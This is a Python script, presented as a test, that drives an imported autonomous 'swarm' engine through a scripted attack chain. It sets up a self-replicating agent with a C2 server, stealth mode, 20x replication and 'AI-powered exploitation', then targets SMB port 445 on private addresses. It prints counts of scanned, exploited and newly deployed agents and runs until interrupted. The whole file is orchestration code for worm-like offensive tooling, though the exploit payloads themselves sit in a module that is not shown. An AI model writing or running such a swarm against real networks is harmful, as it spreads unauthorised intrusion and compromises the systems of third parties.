#!/usr/bin/env python3
"""
Test script to demonstrate the full autonomous attack chain
"""

import time
import json
from agent.autonomous_swarm_agent import AutonomousSwarmEngine

def print_section(title):
    """Print a formatted section header"""
    print(f"\n{'='*80}")
    print(f"  {title}")
    print(f"{'='*80}\n")

def main():
    print_section("SERVERROOT.NET - FULL ATTACK CHAIN DEMONSTRATION")
    
    print("Initializing autonomous swarm with:")
    print("  - AI-Powered Exploitation: ENABLED")
    print("  - Exponential Replication: 20x")
    print("  - Max Generations: 4")
    print("  - Continuous Operation: ENABLED")
    print()
    
    # Initialize swarm
    swarm = AutonomousSwarmEngine(
        c2_server="localhost",
        c2_port=8443,
        enable_stealth=True,
        replication_factor=20,
        max_generations=4,
        auto_start=True,
        ai_enabled=True
    )
    
    print_section("PHASE 1: INITIAL SWARM STATUS")
    status = swarm.get_swarm_status()
    print(f"Running: {status['running']}")
    print(f"Total Agents: {status['total_agents']}")
    print(f"Active Agents: {status['active_agents']}")
    print(f"Coordinator ID: {status['coordinator_id']}")
    
    print_section("PHASE 2: DEPLOYING INITIAL AGENTS")
    
    # Deploy initial agent
    agent1_id = swarm.deploy_agent("192.168.1.10")
    print(f"Deployed Agent 1: {agent1_id}")
    
    # Wait a moment
    time.sleep(2)
    
    # Check status
    status = swarm.get_swarm_status()
    print(f"\nAfter deployment:")
    print(f"  Total Agents: {status['total_agents']}")
    print(f"  Targets Scanned: {status['targets_scanned']}")
    print(f"  Vulnerabilities Found: {status['vulnerabilities_found']}")
    
    print_section("PHASE 3: ISSUING SCAN COMMAND")
    
    # Issue scan range command
    targets = [
        {"ip": "10.0.0.1", "port": 445},
        {"ip": "10.0.0.2", "port": 445},
        {"ip": "10.0.0.3", "port": 445}
    ]
    
    result = swarm.issue_swarm_command({
        "type": "scan_range",
        "targets": targets
    })
    
    print(f"Command issued to {result} agents")
    print(f"Targets added: {len(targets)}")
    
    time.sleep(2)
    
    # Check status
    status = swarm.get_swarm_status()
    print(f"\nAfter command:")
    print(f"  Commands Executed: {status['commands_executed']}")
    print(f"  Neighbors Discovered: {status['neighbors_discovered']}")
    
    print_section("PHASE 4: MONITORING SWARM (5 seconds)")
    
    # Monitor for 5 seconds
    for i in range(5):
        print(f"\n--- Second {i+1} ---")
        status = swarm.get_swarm_status()
        
        print(f"Total Agents: {status['total_agents']}")
        print(f"Targets Scanned: {status['targets_scanned']}")
        print(f"Vulnerabilities Found: {status['vulnerabilities_found']}")
        print(f"Targets Exploited: {status['targets_exploited']}")
        print(f"Agents Deployed: {status['agents_deployed']}")
        print(f"Neighbors Discovered: {status['neighbors_discovered']}")
        
        # Show generations
        print("Generations:", end=" ")
        for gen, count in sorted(status['generations'].items()):
            print(f"G{gen}:{count}", end=" ")
        print()
        
        time.sleep(1)
    
    print_section("PHASE 5: AGENT DETAILS")
    
    status = swarm.get_swarm_status()
    print(f"Total agents in swarm: {len(status['agents'])}")
    
    for agent_info in status['agents'][:3]:  # Show first 3
        print(f"\nAgent: {agent_info['id']}")
        print(f"  Generation: {agent_info['generation']}")
        print(f"  State: {agent_info['state']}")
        print(f"  IP: {agent_info['ip']}")
        print(f"  Scanned: {agent_info['scanned']}")
        print(f"  Vulnerabilities: {agent_info['vulnerabilities']}")
        print(f"  Exploited: {agent_info['exploited']}")
        print(f"  Deployed: {agent_info['deployed']}")
        print(f"  Neighbors: {agent_info['neighbors_discovered']}")
        print(f"  Active: {agent_info['active']}")
    
    print_section("PHASE 6: FINAL STATISTICS")
    
    status = swarm.get_swarm_status()
    
    print(f"Swarm Statistics:")
    print(f"  Running: {status['running']}")
    print(f"  Total Agents: {status['total_agents']}")
    print(f"  Active Agents: {status['active_agents']}")
    print(f"  Coordinator: {status['coordinator_id']}")
    print()
    print(f"Attack Chain Metrics:")
    print(f"  Targets Scanned: {status['targets_scanned']}")
    print(f"  Vulnerabilities Found: {status['vulnerabilities_found']}")
    print(f"  Targets Exploited: {status['targets_exploited']}")
    print(f"  Agents Deployed: {status['agents_deployed']}")
    print(f"  Neighbors Discovered: {status['neighbors_discovered']}")
    print(f"  Commands Executed: {status['commands_executed']}")
    print()
    print(f"Swarm Composition:")
    for gen, count in sorted(status['generations'].items()):
        print(f"  Generation {gen}: {count} agents")
    
    print_section("ATTACK CHAIN DEMONSTRATION COMPLETE")
    
    print("\nThe autonomous swarm is now running with:")
    print("  ✅ SCAN - Automatic network discovery")
    print("  ✅ FIND - Vulnerability discovery")
    print("  ✅ EXPLOIT - AI-powered exploitation")
    print("  ✅ DEPLOY - Self-replication")
    print("  ✅ REPORT - C2 reporting")
    print("  ✅ REPEAT - Continuous operation")
    print("  ✅ Command acceptance - Scan range commands")
    print()
    print("The swarm will continue to operate autonomously.")
    print("Press Ctrl+C to stop.\n")
    
    # Keep running
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("\n\nStopping swarm...")
        swarm.stop_swarm()
        print("Swarm stopped.")

if __name__ == "__main__":
    main()